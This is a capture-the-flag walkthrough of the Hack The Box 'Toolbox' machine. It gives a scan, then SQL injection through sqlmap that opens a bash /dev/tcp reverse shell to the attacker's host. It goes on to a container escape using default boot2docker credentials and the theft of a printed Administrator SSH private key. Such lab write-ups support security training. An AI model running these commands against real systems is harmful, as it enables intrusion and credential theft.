# Target
| Category          | Details                                                |
|-------------------|--------------------------------------------------------|
| 📝 **Name**       | [Toolbox](https://app.hackthebox.com/machines/Toolbox) |  
| 🏷 **Type**       | HTB Machine                                            |
| 🖥 **OS**         | Windows                                                |
| 🎯 **Difficulty** | Easy                                                   |
| 📁 **Tags**       | Postgres, SQLi, sqlmap --os-shell, docker, boot2docker |

# Scan
```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
|   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
|_  256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  tcpwrapped
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.38 (Debian)
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
| Not valid before: 2020-02-18T17:45:56
|_Not valid after:  2021-02-17T17:45:56
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-18T09:34:07
|_  start_date: N/A
```

# Attack path
1. [Gain initial foothold by exploiting SQLi in web application](#gain-initial-foothold-by-exploiting-sqli-in-web-application)
2. [Escalate to `Administrator` using SSH private exfiltrated from directory mounted on Docker host](#escalate-to-administrator-using-ssh-private-exfiltrated-from-directory-mounted-on-docker-host)

### Gain initial foothold by exploiting SQLi in web application

#### Add `megalogistic.com` and `admin.megalogistic.com` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Toolbox]
└─$ echo "$TARGET megalogistic.com admin.megalogistic.com" | sudo tee -a /etc/hosts
10.129.41.203 megalogistic.com admin.megalogistic.com
```

#### Store raw HTTP request for admin panel login
Payload has been obtained with Burp.
```
┌──(magicrc㉿perun)-[~/attack/HTB Toolbox]
└─$ cat <<'EOF'> login.http
POST / HTTP/1.1
Host: admin.megalogistic.com
Cookie: PHPSESSID=64cf5fb20a3c65d94f80518019c4dac1
Content-Length: 28
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://admin.megalogistic.com
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://admin.megalogistic.com/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

username=admin&password=pass
EOF
```

#### Start `netcat` to listen on reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Toolbox]
└─$ nc -lvnp 4444 
listening on [any] 4444 ...
```

#### Use `login.http` to exploit SQLi and spawn reverse shell using `sqlmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Toolbox]
└─$ sqlmap -r login.http --batch --level 3 --force-ssl --os-shell                                                           
<SNIP>
os-shell> /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.23/4444 0>&1'
```

#### Confirm foothold gained
```
connect to [10.10.16.23] from (UNKNOWN) [10.129.41.203] 49798
bash: cannot set terminal process group (236): Inappropriate ioctl for device
bash: no job control in this shell
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ id
id
uid=102(postgres) gid=104(postgres) groups=104(postgres),102(ssl-cert)
```

### Escalate to `Administrator` using SSH private exfiltrated from directory mounted on Docker host

#### Confirm foothold made into `boot2docker` based machine
As we know that target is running on Windows, and we made foothold into Linux system, thus it must be running on virtual machine. Which could be confirmed with:
```
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ uname -a
uname -a
Linux bc56e3cc55e9 4.14.154-boot2docker #1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU/Linux
```

#### Stabilise reverse shell
```
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ /usr/bin/script -qc /bin/bash /dev/null
```

#### Obtain IP address of gateway which will be address of a Docker host
```
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ netstat -rn
netstat -rn
Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
0.0.0.0         172.17.0.1      0.0.0.0         UG        0 0          0 eth0
172.17.0.0      0.0.0.0         255.255.0.0     U         0 0          0 eth0
```

#### Use default `docker:tcuser` credentials for `boot2docker` to escape to the host
```
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ssh docker@172.17.0.1
ssh docker@172.17.0.1
docker@172.17.0.1's password: tcuser

   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

docker@box:~$ id
id
uid=1000(docker) gid=50(staff) groups=50(staff),100(docker)
```

#### Discover Windows host `C:\Users` directory mount
```
docker@box:~$ mount                                                            
<SNIP>
/c/Users on /c/Users type vboxsf (rw,nodev,relatime)
<SNIP>
```

#### Discover `Administrator` SSH private key in mounted directory
```
docker@box:~$ cat /c/Users/Administrator/.ssh/id_rsa                           
cat /c/Users/Administrator/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvo4SLlg/dkStA4jDUNxgF8kbNAF+6IYLNOOCeppfjz6RSOQv
Md08abGynhKMzsiiVCeJoj9L8GfSXGZIfsAIWXn9nyNaDdApoF7Mfm1KItgO+W9m
M7lArs4zgBzMGQleIskQvWTcKrQNdCDj9JxNIbhYLhJXgro+u5dW6EcYzq2MSORm
7A+eXfmPvdr4hE0wNUIwx2oOPr2duBfmxuhL8mZQWu5U1+Ipe2Nv4fAUYhKGTWHj
4ocjUwG9XcU0iI4pcHT3nXPKmGjoPyiPzpa5WdiJ8QpME398Nne4mnxOboWTp3jG
aJ1GunZCyic0iSwemcBJiNyfZChTipWmBMK88wIDAQABAoIBAH7PEuBOj+UHrM+G
Stxb24LYrUa9nBPnaDvJD4LBishLzelhGNspLFP2EjTJiXTu5b/1E82qK8IPhVlC
JApdhvDsktA9eWdp2NnFXHbiCg0IFWb/MFdJd/ccd/9Qqq4aos+pWH+BSFcOvUlD
vg+BmH7RK7V1NVFk2eyCuS4YajTW+VEwD3uBAl5ErXuKa2VP6HMKPDLPvOGgBf9c
l0l2v75cGjiK02xVu3aFyKf3d7t/GJBgu4zekPKVsiuSA+22ZVcTi653Tum1WUqG
MjuYDIaKmIt9QTn81H5jAQG6CMLlB1LZGoOJuuLhtZ4qW9fU36HpuAzUbG0E/Fq9
jLgX0aECgYEA4if4borc0Y6xFJxuPbwGZeovUExwYzlDvNDF4/Vbqnb/Zm7rTW/m
YPYgEx/p15rBh0pmxkUUybyVjkqHQFKRgu5FSb9IVGKtzNCtfyxDgsOm8DBUvFvo
qgieIC1S7sj78CYw1stPNWS9lclTbbMyqQVjLUvOAULm03ew3KtkURECgYEA17Nr
Ejcb6JWBnoGyL/yEG44h3fHAUOHpVjEeNkXiBIdQEKcroW9WZY9YlKVU/pIPhJ+S
7s++kIu014H+E2SV3qgHknqwNIzTWXbmqnclI/DSqWs19BJlD0/YUcFnpkFG08Xu
iWNSUKGb0R7zhUTZ136+Pn9TEGUXQMmBCEOJLcMCgYBj9bTJ71iwyzgb2xSi9sOB
MmRdQpv+T2ZQQ5rkKiOtEdHLTcV1Qbt7Ke59ZYKvSHi3urv4cLpCfLdB4FEtrhEg
5P39Ha3zlnYpbCbzafYhCydzTHl3k8wfs5VotX/NiUpKGCdIGS7Wc8OUPBtDBoyi
xn3SnIneZtqtp16l+p9pcQKBgAg1Xbe9vSQmvF4J1XwaAfUCfatyjb0GO9j52Yp7
MlS1yYg4tGJaWFFZGSfe+tMNP+XuJKtN4JSjnGgvHDoks8dbYZ5jaN03Frvq2HBY
RGOPwJSN7emx4YKpqTPDRmx/Q3C/sYos628CF2nn4aCKtDeNLTQ3qDORhUcD5BMq
bsf9AoGBAIWYKT0wMlOWForD39SEN3hqP3hkGeAmbIdZXFnUzRioKb4KZ42sVy5B
q3CKhoCDk8N+97jYJhPXdIWqtJPoOfPj6BtjxQEBoacW923tOblPeYkI9biVUyIp
BYxKDs3rNUsW1UUHAvBh0OYs+v/X+Z/2KVLLeClznDJWh/PNqF5I
-----END RSA PRIVATE KEY-----
```

#### Exfiltrate key and use to access target over SSH
```
┌──(magicrc㉿perun)-[~/attack/HTB Toolbox]
└─$ ssh Administrator@$TARGET -i id_rsa
Microsoft Windows [Version 10.0.17763.1039]
(c) 2018 Microsoft Corporation. All rights reserved.

administrator@TOOLBOX C:\Users\Administrator>whoami
toolbox\administrator
```
